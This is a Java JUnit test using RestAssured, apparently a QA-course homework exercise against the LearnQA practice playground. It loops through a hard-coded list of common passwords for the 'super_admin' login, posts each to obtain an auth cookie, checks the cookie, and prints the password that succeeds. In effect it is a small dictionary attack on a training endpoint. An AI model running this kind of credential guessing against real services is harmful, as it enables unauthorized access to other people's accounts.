import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class testGetResponse {
    @Test
    public void checkValidCookies()
    {
        String locationToGetCookie = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
        String checkCookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";
        String login = "super_admin";
        String correctAuthText = "You are authorized";
        String notFoundCorrectPassword = "There is not correct password";
        boolean checkedCorrectPassword = false;
        ArrayList<String> passwordsArray = new ArrayList<>(
                Arrays.asList("123456",
                        "123456789",
                        "qwerty",
                        "password",
                        "1234567",
                        "1234567",
                        "12345",
                        "iloveyou",
                        "111111",
                        "123123",
                        "abc123",
                        "qwerty123",
                        "1q2w3e4r",
                        "admin",
                        "qwertyuiop",
                        "654321",
                        "555555",
                        "lovely",
                        "7777777",
                        "welcome",
                        "888888",
                        "princess",
                        "dragon",
                        "password1",
                        "123qwe"
                        )
        );

        while (!checkedCorrectPassword){
            for (String password : passwordsArray) {
                Map<String, Object> body = new HashMap<>();
                body.put("login", login);
                body.put("password", password);
                String responseCookie = "";
                String responseCookieBody = "";

                Response response = RestAssured
                        .given()
                        .body(body)
                        .post(locationToGetCookie)
                        .andReturn();
                responseCookie = response.getCookie("auth_cookie");
                Map<String, String> cookie = new HashMap<>();
                cookie.put("auth_cookie", responseCookie);

                Response checkCookies = RestAssured
                        .given()
                        .cookies(cookie)
                        .get(checkCookie)
                        .andReturn();
                responseCookieBody = checkCookies.getBody().asString();

                if (responseCookieBody.equals(correctAuthText)) {
                    checkedCorrectPassword = true;
                    System.out.println("Correct password is " + password + "\n" + responseCookieBody);
                    break;
                }
            }
            if (!checkedCorrectPassword){
                System.out.println(notFoundCorrectPassword);
            }
            break;
        }
    }
}
